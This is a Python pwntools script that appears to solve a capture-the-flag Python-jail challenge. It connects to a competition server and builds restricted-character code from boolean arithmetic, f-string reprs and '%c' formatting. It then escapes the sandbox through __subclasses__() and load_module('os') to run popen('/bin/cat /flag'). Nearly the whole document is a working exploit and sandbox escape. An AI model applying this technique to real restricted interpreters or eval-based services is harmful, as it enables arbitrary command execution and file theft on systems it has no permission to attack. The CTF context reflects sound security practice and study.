#!/usr/local/bin/python3
from pwn import *
import string

conn = remote('effing-awesome-finals.ctfcompetition.com', 1337)

# We'll build up our exploit line-by-line here.
exploit = []

# This dict stores mappings from values to variable names.
f = {
1   : 'ff',
2   : 'fff',
4   : 'ffff',
8   : 'fffff',
16  : 'ffffff',
32  : 'fffffff',
64  : 'ffffffff',
128 : 'fffffffff',
'c' : '_',
'f' : 'f'
}

# Manually build up variables for first 8 powers of 2.
exploit.append(f"{f[  1]}=[]<=[]")           # 1   = [] <= []
exploit.append(f"{f[  2]}={f[ 1]}<<{f[1]}")  # 2   = 1  << 1
exploit.append(f"{f[  4]}={f[ 2]}<<{f[1]}")  # 4   = 2  << 1
exploit.append(f"{f[  8]}={f[ 4]}<<{f[1]}")  # 8   = 4  << 1
exploit.append(f"{f[ 16]}={f[ 8]}<<{f[1]}")  # 16  = 8  << 1
exploit.append(f"{f[ 32]}={f[16]}<<{f[1]}")  # 32  = 16 << 1
exploit.append(f"{f[ 64]}={f[32]}<<{f[1]}")  # 64  = 32 << 1
exploit.append(f"{f[128]}={f[64]}<<{f[1]}")  # 128 = 64 << 1

# Returns a string that evaluates to any 8-bit integer using the above variables.
def enc(a):
  assert a < 256
  bits = []
  for i in range(8):
    if a % 2 == 1:
      bits.append(1<<i)
    a //= 2
  return '+'.join([f[b] for b in bits])

# Use an f-string to produce the string '<built-in function eval>' = f"{f}".
# Get the 13th index of this string to obtain the character 'c'.
exploit.append(f"{f['c']}=f'{{f}}'[{enc(13)}]") # 'c' = '<built-in function eval>'[13]

# Create a variable for each lowercase character remaining in the alphabet.
# This relies on the fact that '%c' % x returns chr(x).
for c in string.ascii_lowercase:
  if c == 'c' or c == 'f':
    continue
  ascii = ord(c)
  # Use binary repr. of the ascii value of c to produce a unique variable name.
  f_str = "{0:b}".format(ascii).replace('0','_').replace('1','f')
  exploit.append(f"{f_str}=('%'+{f['c']})%({enc(ascii)})")     # 'a' = '%c' % 97
  f[c] = f_str

# Identify the index of a class that contains the 'os' module.
for i, klazz in enumerate({}.__class__.__base__.__subclasses__()):
  try:
    klazz.load_module('os')
    break
  except:
    continue

# Once we have the 'os' module we can use it to cat the flag.
cat_flag = "{}.__class__.__base__.__subclasses__()[#].load_module('os').popen('/bin/cat /flag').read()"
cat_flag = cat_flag.replace('#', enc(i))

# Take the above string, and replace all invalid characters (non-'f' lowercase
# letters) with their corresponding variable.
parts = []
run = ''
for c in cat_flag:
  if c in string.ascii_lowercase.replace('f',''):
    if run:
      parts.append('"' + run + '"')
      run = ''
    parts.append(f[c])
  else:
    run += c
if run:
  parts.append('"' + run + '"')

# Finally we need to eval this string by calling f on it.
exploit.append("f(" + '+'.join(parts) + ")")

# Output our raw exploit to a file
with open('raw_exploit', 'w') as f:
  for line in exploit:
    f.write(line)

# Send our exploit line by line to the server and print the result
print(conn.recvuntil('>>> '))
for line in exploit:
  line = line.strip()
  if line:
    conn.sendline(line)
    print(conn.recvuntil('>>> '))
